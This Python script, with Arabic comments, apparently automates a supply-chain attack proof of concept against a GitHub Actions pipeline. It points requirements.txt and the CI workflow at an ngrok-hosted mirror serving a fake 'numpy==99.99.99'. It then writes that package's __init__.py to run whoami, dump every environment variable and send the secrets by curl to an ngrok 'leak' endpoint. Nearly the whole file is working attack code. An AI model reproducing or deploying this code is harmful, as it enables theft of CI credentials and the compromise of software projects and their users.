import os

# ✅ روابط ngrok الحالية
ngrok_web = "https://74cb59ca3c50.ngrok-free.app"   # لـ fake numpy (port 8080)
ngrok_leak = "https://8b2a04c2b4a4.ngrok-free.app"  # لـ leak listener (port 5000)

# 1️⃣ تحديث requirements.txt
with open("requirements.txt", "w") as f:
    f.write(f"--find-links {ngrok_web}\n")
    f.write("numpy==99.99.99\n")
print(f"[✔] Updated requirements.txt with ngrok mirror: {ngrok_web}")

# 2️⃣ تحديث evil_numpy/numpy/__init__.py
init_path = "evil_numpy/numpy/__init__.py"
init_content = f"""
import os
import subprocess

try:
    user = subprocess.check_output("whoami", shell=True).decode().strip()
    cwd = os.getcwd()
    print("🔥 RCE via fake numpy inside GitHub Actions confirmed!")
    print(f"👤 USER: {{user}}")
    print(f"📂 DIR: {{cwd}}")

    secrets = subprocess.check_output("env", shell=True).decode()
    subprocess.call(
        "curl -X POST -d '{{}}' {ngrok_leak}/leak".format(secrets),
        shell=True
    )

except Exception as e:
    with open("fail_log.txt", "w") as f:
        f.write(str(e))
""".strip()
with open(init_path, "w") as f:
    f.write(init_content + "\n")
print(f"[✔] Updated {init_path} with leak endpoint: {ngrok_leak}/leak")

# 3️⃣ تحديث poc_subprocess_index_attack.py
poc_path = "poc_subprocess_index_attack.py"
poc_content = f"""
import subprocess
import os

# إنشاء بيئة افتراضية
subprocess.run(["python3", "-m", "venv", "rce-venv"], check=True)

# تثبيت numpy المزيف من ngrok
subprocess.run([
    "./rce-venv/bin/pip", "install",
    f"--find-links={ngrok_web}",
    "numpy==99.99.99"
], check=True)

# تشغيل main.py بعد تنفيذ RCE
subprocess.run([
    "./rce-venv/bin/python", "main.py"
], check=True)
""".strip()
with open(poc_path, "w") as f:
    f.write(poc_content + "\n")
print(f"[✔] Updated {poc_path} with install + execution using: {ngrok_web}")

# 4️⃣ تحديث .github/workflows/ci.yml
ci_path = ".github/workflows/ci.yml"
ci_updated_lines = []
with open(ci_path, "r") as f:
    for line in f:
        if "--find-links" in line:
            prefix = line.split("--find-links")[0]
            ci_updated_lines.append(f"{prefix}--find-links {ngrok_web} -r requirements.txt\n")
        else:
            ci_updated_lines.append(line)
with open(ci_path, "w") as f:
    f.writelines(ci_updated_lines)
print(f"[✔] Updated {ci_path} with install link: {ngrok_web}")

